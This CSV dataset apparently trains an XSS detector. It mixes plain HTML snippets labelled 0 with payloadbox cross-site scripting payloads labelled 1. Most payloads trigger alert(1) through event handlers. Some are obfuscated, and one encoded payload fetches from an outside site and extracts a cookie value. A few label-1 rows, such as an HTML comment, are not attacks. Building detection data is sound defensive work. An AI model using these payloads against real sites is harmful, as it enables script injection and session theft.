text,label,source,length,timestamp
<p>About</p>,0,generated,12,2026-02-09T15:05:27.735774
<svg><abbr onload=alert(1)></abbr>,1,payloadbox,34,2026-02-09T15:05:27.722765
"<style>:target {color: red;}</style><rtc id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></rtc>",1,payloadbox,109,2026-02-09T15:05:27.721766
"<audio oncontextmenu=""alert(1)"">test</audio>",1,payloadbox,44,2026-02-09T15:05:27.714766
"<bgsound oncopy=""alert(1)"" contenteditable>test</bgsound>",1,payloadbox,57,2026-02-09T15:05:27.715767
<frameset id=x tabindex=1 onactivate=alert(1)></frameset>,1,payloadbox,57,2026-02-09T15:05:27.717767
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.727768
"<iframe onmouseup=""alert(1)"">test</iframe>",1,payloadbox,42,2026-02-09T15:05:27.717767
"<output oncut=""alert(1)"" contenteditable>test</output>",1,payloadbox,54,2026-02-09T15:05:27.719771
"<i onkeyup=""alert(1)"" contenteditable>test</i>",1,payloadbox,46,2026-02-09T15:05:27.717767
"<address onmousedown=""alert(1)"">test</address>",1,payloadbox,46,2026-02-09T15:05:27.714766
"<svg onkeydown=""alert(1)"" contenteditable>test</svg>",1,payloadbox,52,2026-02-09T15:05:27.722765
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.736778
<h6>Login</h6>,0,generated,14,2026-02-09T15:05:27.733766
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.741766
"<tt onkeydown=""alert(1)"" contenteditable>test</tt>",1,payloadbox,50,2026-02-09T15:05:27.723765
<q id=x tabindex=1 onbeforedeactivate=alert(1)></q><input autofocus>,1,payloadbox,68,2026-02-09T15:05:27.720768
"<style>@keyframes x{}</style><dt style=""animation-name:x"" onanimationend=""alert(1)""></dt>",1,payloadbox,89,2026-02-09T15:05:27.722765
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.738766
"<frame onpaste=""alert(1)"" contenteditable>test</frame>",1,payloadbox,54,2026-02-09T15:05:27.717767
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.742765
"<h1 oncopy=""alert(1)"" contenteditable>test</h1>",1,payloadbox,47,2026-02-09T15:05:27.717767
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.737767
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.733766
<p>About</p>,0,generated,12,2026-02-09T15:05:27.732765
"<command oncopy=""alert(1)"" contenteditable>test</command>",1,payloadbox,57,2026-02-09T15:05:27.715767
"<div draggable=""true"" ondragleave=""alert(1)"">test</div>",1,payloadbox,55,2026-02-09T15:05:27.716766
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.728766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.733766
<p>About</p>,0,generated,12,2026-02-09T15:05:27.739765
<p>About</p>,0,generated,12,2026-02-09T15:05:27.732765
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.732765
"<font onbeforepaste=""alert(1)"" contenteditable>test</font>",1,payloadbox,58,2026-02-09T15:05:27.717767
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.727768
<p>About</p>,0,generated,12,2026-02-09T15:05:27.742765
"<blink onmouseleave=""alert(1)"">test</blink>",1,payloadbox,43,2026-02-09T15:05:27.715767
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.730765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.738766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.726766
"<li draggable=""true"" ondragenter=""alert(1)"">test</li>",1,payloadbox,53,2026-02-09T15:05:27.718768
<source id=x tabindex=1 onactivate=alert(1)></source>,1,payloadbox,53,2026-02-09T15:05:27.720768
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.733766
"<style>:target {color: red;}</style><ruby id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></ruby>",1,payloadbox,111,2026-02-09T15:05:27.721766
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.729765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.728766
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.736778
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.725769
"<style>:target {transform: rotate(180deg);}</style><shadow id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></shadow>",1,payloadbox,130,2026-02-09T15:05:27.721766
"<style>:target {transform: rotate(180deg);}</style><source id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></source>",1,payloadbox,130,2026-02-09T15:05:27.721766
<p>About</p>,0,generated,12,2026-02-09T15:05:27.743765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.729765
"<xmp onkeydown=""alert(1)"" contenteditable>test</xmp>",1,payloadbox,52,2026-02-09T15:05:27.724768
"<style>@keyframes x{}</style><base style=""animation-name:x"" onanimationstart=""alert(1)""></base>",1,payloadbox,95,2026-02-09T15:05:27.722765
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.730765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.738766
"<tfoot onclick=""alert(1)"">test</tfoot>",1,payloadbox,38,2026-02-09T15:05:27.723765
"<div draggable=""true"" contenteditable>drag me</div><div ondrop=alert(1) contenteditable>drop here</div>",1,payloadbox,103,2026-02-09T15:05:27.716766
"<marquee draggable=""true"" ondragstart=""alert(1)"">test</marquee>",1,payloadbox,63,2026-02-09T15:05:27.718768
<aside id=x tabindex=1 ondeactivate=alert(1)></aside><input id=y autofocus>,1,payloadbox,75,2026-02-09T15:05:27.714766
<span class='class-804'>Services</span>,0,generated,39,2026-02-09T15:05:27.727768
<span class='class-3444'>Services</span>,0,generated,40,2026-02-09T15:05:27.735774
"<header onmousemove=""alert(1)"">test</header>",1,payloadbox,44,2026-02-09T15:05:27.717767
"<p onkeypress=""alert(1)"" contenteditable>test</p>",1,payloadbox,49,2026-02-09T15:05:27.719771
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.739765
<p>About</p>,0,generated,12,2026-02-09T15:05:27.732765
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.730765
<!-- Up to Opera 12.x -->,1,payloadbox,25,2026-02-09T15:05:27.725769
"<source draggable=""true"" ondrag=""alert(1)"">test</source>",1,payloadbox,56,2026-02-09T15:05:27.720768
"<noembed onpaste=""alert(1)"" contenteditable>test</noembed>",1,payloadbox,58,2026-02-09T15:05:27.719771
"<pre oncut=""alert(1)"" contenteditable>test</pre>",1,payloadbox,48,2026-02-09T15:05:27.719771
<image id=x tabindex=1 onfocus=alert(1)></image>,1,payloadbox,48,2026-02-09T15:05:27.717767
"<time onmouseenter=""alert(1)"">test</time>",1,payloadbox,41,2026-02-09T15:05:27.723765
<input onfocusout=alert(1) id=x><input autofocus>,1,payloadbox,49,2026-02-09T15:05:27.718768
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.727768
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.727768
<h6>Login</h6>,0,generated,14,2026-02-09T15:05:27.726766
"<form onmousedown=""alert(1)"">test</form>",1,payloadbox,40,2026-02-09T15:05:27.717767
<p>About</p>,0,generated,12,2026-02-09T15:05:27.739765
"<del onmouseover=""alert(1)"">test</del>",1,payloadbox,38,2026-02-09T15:05:27.716766
"<cite onclick=""alert(1)"">test</cite>",1,payloadbox,36,2026-02-09T15:05:27.715767
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.740766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.736778
<span class='class-6164'>Services</span>,0,generated,40,2026-02-09T15:05:27.742765
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.725769
<span class='class-2364'>Services</span>,0,generated,40,2026-02-09T15:05:27.731765
"<dl oncut=""alert(1)"" contenteditable>test</dl>",1,payloadbox,46,2026-02-09T15:05:27.716766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.729765
<span class='class-6264'>Services</span>,0,generated,40,2026-02-09T15:05:27.743765
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.731765
<h6>Login</h6>,0,generated,14,2026-02-09T15:05:27.739765
"<rb onmouseout=""alert(1)"">test</rb>",1,payloadbox,35,2026-02-09T15:05:27.720768
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.733766
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.738766
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><address id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></address>",1,payloadbox,184,2026-02-09T15:05:27.722765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.740766
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.740766
"<isindex onmouseleave=""alert(1)"">test</isindex>",1,payloadbox,47,2026-02-09T15:05:27.718768
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.728766
"<div id=""110""><svg xmlns=""http://www.w3.org/2000/svg"">",1,payloadbox,54,2026-02-09T15:05:27.725769
"<optgroup oncut=""alert(1)"" contenteditable>test</optgroup>",1,payloadbox,58,2026-02-09T15:05:27.719771
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.730765
"<colgroup onkeyup=""alert(1)"" contenteditable>test</colgroup>",1,payloadbox,60,2026-02-09T15:05:27.715767
"<data oncopy=""alert(1)"" contenteditable>test</data>",1,payloadbox,51,2026-02-09T15:05:27.715767
"<video autoplay controls onseeked=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1,payloadbox,97,2026-02-09T15:05:27.724768
"<figure onbeforecopy=""alert(1)"" contenteditable>test</figure>",1,payloadbox,61,2026-02-09T15:05:27.717767
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.741766
"<col onmouseup=""alert(1)"">test</col>",1,payloadbox,36,2026-02-09T15:05:27.715767
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.727768
"<style>@keyframes x{}</style><map style=""animation-name:x"" onanimationstart=""alert(1)""></map>",1,payloadbox,93,2026-02-09T15:05:27.722765
<span class='class-424'>Services</span>,0,generated,39,2026-02-09T15:05:27.726766
"<div id=""53""><xml id=""xss"" src=""test.htc""></xml>",1,payloadbox,48,2026-02-09T15:05:27.725769
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.730765
<isindex id=x tabindex=1 onactivate=alert(1)></isindex>,1,payloadbox,55,2026-02-09T15:05:27.718768
<body onorientationchange=alert(1)>,1,payloadbox,35,2026-02-09T15:05:27.713767
"<input onbeforecopy=alert(1) value=""XSS"" autofocus>",1,payloadbox,51,2026-02-09T15:05:27.718768
"<ins oncontextmenu=""alert(1)"">test</ins>",1,payloadbox,40,2026-02-09T15:05:27.718768
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.734777
"<select ondblclick=""alert(1)"">test</select>",1,payloadbox,43,2026-02-09T15:05:27.720768
"<hgroup oncut=""alert(1)"" contenteditable>test</hgroup>",1,payloadbox,54,2026-02-09T15:05:27.717767
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.742765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.726766
"<style>:target {color: red;}</style><blockquote id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></blockquote>",1,payloadbox,123,2026-02-09T15:05:27.721766
<colgroup id=x tabindex=1 onfocus=alert(1)></colgroup>,1,payloadbox,54,2026-02-09T15:05:27.715767
<image id=x tabindex=1 onbeforeactivate=alert(1)></image>,1,payloadbox,57,2026-02-09T15:05:27.717767
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.729765
"<div draggable=""true"" contenteditable>drag me</div><ruby ondragover=alert(1) contenteditable>drop here</ruby>",1,payloadbox,109,2026-02-09T15:05:27.716766
<image id=x tabindex=1 ondeactivate=alert(1)></image><input id=y autofocus>,1,payloadbox,75,2026-02-09T15:05:27.717767
"<progress draggable=""true"" ondragleave=""alert(1)"">test</progress>",1,payloadbox,65,2026-02-09T15:05:27.720768
"<slot draggable=""true"" ondragenter=""alert(1)"">test</slot>",1,payloadbox,57,2026-02-09T15:05:27.720768
"<IMG SRC=""mocha:[code]"">",1,payloadbox,24,2026-02-09T15:05:27.724768
"<a id=""x""><rect fill=""white"" width=""1000"" height=""1000""/></a>",1,payloadbox,61,2026-02-09T15:05:27.725769
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.743765
"<?a foo=x=`y><img alt=""`><img src=xx:x onerror=alert(3)//"">//[""'`-->]]>]</div>",1,payloadbox,78,2026-02-09T15:05:27.725769
"<noscript draggable=""true"" ondragenter=""alert(1)"">test</noscript>",1,payloadbox,65,2026-02-09T15:05:27.719771
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.743765
"';a=prompt,a()//",1,payloadbox,16,2026-02-09T15:05:27.713767
<table id=x tabindex=1 onfocusin=alert(1)></table>,1,payloadbox,50,2026-02-09T15:05:27.723765
<ul id=x tabindex=1 onactivate=alert(1)></ul>,1,payloadbox,45,2026-02-09T15:05:27.723765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.742765
<p>About</p>,0,generated,12,2026-02-09T15:05:27.737767
<tfoot id=x tabindex=1 onactivate=alert(1)></tfoot>,1,payloadbox,51,2026-02-09T15:05:27.723765
"<rt draggable=""true"" ondragstart=""alert(1)"">test</rt>",1,payloadbox,53,2026-02-09T15:05:27.720768
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.731765
"<meta onmouseover=""alert(1)"">test</meta>",1,payloadbox,40,2026-02-09T15:05:27.719771
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.732765
"<audio onmouseout=""alert(1)"">test</audio>",1,payloadbox,41,2026-02-09T15:05:27.714766
<ruby id=x tabindex=1 ondeactivate=alert(1)></ruby><input id=y autofocus>,1,payloadbox,73,2026-02-09T15:05:27.720768
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.742765
"<script>  function foo(elem, doc, text) {   elem.onclick = function (e) {    e.__defineGetter__(text[0], function () { return true })    alert(Safe.get());   };      var event = doc.createEvent(text[1]);   event.initEvent(text[2], true, true);   elem.dispatchEvent(event);  } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> #",1,payloadbox,449,2026-02-09T15:05:27.724768
"<style>:target {color:red;}</style><th id=x style=""transition:color 1s"" ontransitionend=alert(1)></th>",1,payloadbox,102,2026-02-09T15:05:27.721766
<svg><output onload=alert(1)></output>,1,payloadbox,38,2026-02-09T15:05:27.723765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.728766
"<time draggable=""true"" ondragstart=""alert(1)"">test</time>",1,payloadbox,57,2026-02-09T15:05:27.723765
<time id=x tabindex=1 onbeforeactivate=alert(1)></time>,1,payloadbox,55,2026-02-09T15:05:27.723765
<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>,1,payloadbox,56,2026-02-09T15:05:27.713767
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.738766
"<kbd draggable=""true"" ondragstart=""alert(1)"">test</kbd>",1,payloadbox,55,2026-02-09T15:05:27.718768
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.726766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.730765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.728766
"<source onclick=""alert(1)"">test</source>",1,payloadbox,40,2026-02-09T15:05:27.720768
"<applet draggable=""true"" ondragend=""alert(1)"">test</applet>",1,payloadbox,59,2026-02-09T15:05:27.714766
"<details onmousedown=""alert(1)"">test</details>",1,payloadbox,46,2026-02-09T15:05:27.716766
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.731765
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.736778
<p onfocusout=alert(1) tabindex=1 id=x></p><input autofocus>,1,payloadbox,60,2026-02-09T15:05:27.719771
"<a href=http://foo.bar/#x=`y></a><img alt=""`><img src=xx:x onerror=alert(108)></a>"">",1,payloadbox,84,2026-02-09T15:05:27.725769
"<style>:target {color: red;}</style><video id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></video>",1,payloadbox,113,2026-02-09T15:05:27.721766
"<style>@keyframes x{}</style><blockquote style=""animation-name:x"" onanimationstart=""alert(1)""></blockquote>",1,payloadbox,107,2026-02-09T15:05:27.722765
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><button id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></button>",1,payloadbox,182,2026-02-09T15:05:27.722765
<svg><ol onload=alert(1)></ol>,1,payloadbox,30,2026-02-09T15:05:27.723765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.732765
<title id=x tabindex=1 onfocusin=alert(1)></title>,1,payloadbox,50,2026-02-09T15:05:27.723765
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.730765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.734777
"<audio id=x controls onfocusin=alert(1) id=x><source src=""validaudio.wav""></audio>",1,payloadbox,82,2026-02-09T15:05:27.714766
<span class='class-2234'>Services</span>,0,generated,40,2026-02-09T15:05:27.731765
"<hgroup onmouseover=""alert(1)"">test</hgroup>",1,payloadbox,44,2026-02-09T15:05:27.717767
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.730765
<p>About</p>,0,generated,12,2026-02-09T15:05:27.729765
"<xmp onmouseover=""alert(1)"">test</xmp>",1,payloadbox,38,2026-02-09T15:05:27.724768
<blockquote id=x tabindex=1 onfocusin=alert(1)></blockquote>,1,payloadbox,60,2026-02-09T15:05:27.715767
<p>About</p>,0,generated,12,2026-02-09T15:05:27.725769
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.732765
"<audio controls autoplay onended=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1,payloadbox,96,2026-02-09T15:05:27.714766
"<style>@keyframes slidein {}</style><article style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></article>",1,payloadbox,168,2026-02-09T15:05:27.721766
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.728766
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.737767
<p>About</p>,0,generated,12,2026-02-09T15:05:27.730765
<u onfocusout=alert(1) tabindex=1 id=x></u><input autofocus>,1,payloadbox,60,2026-02-09T15:05:27.723765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.743765
"<link onbeforepaste=""alert(1)"" contenteditable>test</link>",1,payloadbox,58,2026-02-09T15:05:27.718768
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.731765
"<style>@keyframes x{}</style><datalist style=""animation-name:x"" onanimationend=""alert(1)""></datalist>",1,payloadbox,101,2026-02-09T15:05:27.722765
"<menu oncontextmenu=""alert(1)"">test</menu>",1,payloadbox,42,2026-02-09T15:05:27.718768
<link id=x tabindex=1 onbeforedeactivate=alert(1)></link><input autofocus>,1,payloadbox,74,2026-02-09T15:05:27.718768
"<video controls autoplay ontimeupdate=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1,payloadbox,101,2026-02-09T15:05:27.724768
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.734777
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.728766
"<div draggable=""true"" contenteditable>drag me</div><legend ondrop=alert(1) contenteditable>drop here</legend>",1,payloadbox,109,2026-02-09T15:05:27.716766
"<style>@keyframes x{}</style><select style=""animation-name:x"" onanimationstart=""alert(1)""></select>",1,payloadbox,99,2026-02-09T15:05:27.722765
"<content onbeforepaste=""alert(1)"" contenteditable>test</content>",1,payloadbox,64,2026-02-09T15:05:27.715767
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.737767
"<div draggable=""true"" contenteditable>drag me</div><base ondragover=alert(1) contenteditable>drop here</base>",1,payloadbox,109,2026-02-09T15:05:27.716766
<span class='class-1174'>Services</span>,0,generated,40,2026-02-09T15:05:27.728766
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.736778
"<style>@keyframes slidein {}</style><title style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></title>",1,payloadbox,164,2026-02-09T15:05:27.722765
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.726766
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.737767
"<output onmouseleave=""alert(1)"">test</output>",1,payloadbox,45,2026-02-09T15:05:27.719771
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.729765
"<isindex onkeydown=""alert(1)"" contenteditable>test</isindex>",1,payloadbox,60,2026-02-09T15:05:27.718768
<span class='class-104'>Services</span>,0,generated,39,2026-02-09T15:05:27.725769
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.741766
"<bgsound onmouseover=""alert(1)"">test</bgsound>",1,payloadbox,46,2026-02-09T15:05:27.715767
"<style>:target {color: red;}</style><frameset id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></frameset>",1,payloadbox,119,2026-02-09T15:05:27.721766
"<style>:target {transform: rotate(180deg);}</style><figcaption id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></figcaption>",1,payloadbox,138,2026-02-09T15:05:27.721766
"<head onbeforecopy=""alert(1)"" contenteditable>test</head>",1,payloadbox,57,2026-02-09T15:05:27.717767
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.740766
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.728766
alert&#40;1&#41,1,payloadbox,15,2026-02-09T15:05:27.714766
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.727768
<rt onblur=alert(1) tabindex=1 id=x></rt><input autofocus>,1,payloadbox,58,2026-02-09T15:05:27.720768
"<style>:target {transform: rotate(180deg);}</style><tbody id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></tbody>",1,payloadbox,128,2026-02-09T15:05:27.721766
<h6>Login</h6>,0,generated,14,2026-02-09T15:05:27.736778
<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>,1,payloadbox,71,2026-02-09T15:05:27.715767
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.738766
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.737767
"<div draggable=""true"" contenteditable>drag me</div><table ondrop=alert(1) contenteditable>drop here</table>",1,payloadbox,107,2026-02-09T15:05:27.716766
"<i oncontextmenu=""alert(1)"">test</i>",1,payloadbox,36,2026-02-09T15:05:27.717767
<span class='class-2064'>Services</span>,0,generated,40,2026-02-09T15:05:27.730765
"<style>:target {transform: rotate(180deg);}</style><dfn id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dfn>",1,payloadbox,124,2026-02-09T15:05:27.721766
"<isindex draggable=""true"" ondragenter=""alert(1)"">test</isindex>",1,payloadbox,63,2026-02-09T15:05:27.718768
"<b onmouseenter=""alert(1)"">test</b>",1,payloadbox,35,2026-02-09T15:05:27.714766
<svg><dfn onload=alert(1)></dfn>,1,payloadbox,32,2026-02-09T15:05:27.723765
"<object onmouseover=""alert(1)"">test</object>",1,payloadbox,44,2026-02-09T15:05:27.719771
"<summary onkeypress=""alert(1)"" contenteditable>test</summary>",1,payloadbox,61,2026-02-09T15:05:27.722765
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.743765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.732765
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.734777
<samp onfocusout=alert(1) tabindex=1 id=x></samp><input autofocus>,1,payloadbox,66,2026-02-09T15:05:27.720768
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.726766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.729765
<span class='class-6604'>Services</span>,0,generated,40,2026-02-09T15:05:27.744765
"<bdi onkeyup=""alert(1)"" contenteditable>test</bdi>",1,payloadbox,50,2026-02-09T15:05:27.714766
"<figcaption onbeforecopy=""alert(1)"" contenteditable>test</figcaption>",1,payloadbox,69,2026-02-09T15:05:27.717767
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.726766
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.732765
"<tbody onmousedown=""alert(1)"">test</tbody>",1,payloadbox,42,2026-02-09T15:05:27.723765
"<div draggable=""true"" contenteditable>drag me</div><plaintext ondragover=alert(1) contenteditable>drop here</plaintext>",1,payloadbox,119,2026-02-09T15:05:27.716766
<p>About</p>,0,generated,12,2026-02-09T15:05:27.740766
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.742765
"<plaintext onmousedown=""alert(1)"">test</plaintext>",1,payloadbox,50,2026-02-09T15:05:27.719771
"<progress onmouseup=""alert(1)"">test</progress>",1,payloadbox,46,2026-02-09T15:05:27.720768
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.728766
"<menuitem onmousemove=""alert(1)"">test</menuitem>",1,payloadbox,48,2026-02-09T15:05:27.718768
"<plaintext onmouseenter=""alert(1)"">test</plaintext>",1,payloadbox,51,2026-02-09T15:05:27.719771
<math><brute href=javascript:alert(1)>click,1,payloadbox,43,2026-02-09T15:05:27.713767
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.735774
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.732765
"<iframe onkeyup=""alert(1)"" contenteditable>test</iframe>",1,payloadbox,56,2026-02-09T15:05:27.717767
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.726766
"<style>@keyframes x{}</style><span style=""animation-name:x"" onanimationstart=""alert(1)""></span>",1,payloadbox,95,2026-02-09T15:05:27.722765
<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\/script%26gt;\%26quot;%26quot;) autofocus></textarea>,1,payloadbox,497,2026-02-09T15:05:27.724768
<span class='class-5214'>Services</span>,0,generated,40,2026-02-09T15:05:27.740766
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>,1,payloadbox,55,2026-02-09T15:05:27.724768
"<pre onmouseup=""alert(1)"">test</pre>",1,payloadbox,36,2026-02-09T15:05:27.720768
<span class='class-1624'>Services</span>,0,generated,40,2026-02-09T15:05:27.729765
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.738766
"<frameset draggable=""true"" ondragenter=""alert(1)"">test</frameset>",1,payloadbox,65,2026-02-09T15:05:27.717767
<figcaption id=x tabindex=1 onfocusin=alert(1)></figcaption>,1,payloadbox,60,2026-02-09T15:05:27.717767
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.731765
<p>About</p>,0,generated,12,2026-02-09T15:05:27.739765
<input type=checkbox id=x onfocus=alert(1)>,1,payloadbox,43,2026-02-09T15:05:27.718768
"<embed onkeyup=""alert(1)"" contenteditable>test</embed>",1,payloadbox,54,2026-02-09T15:05:27.717767
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.740766
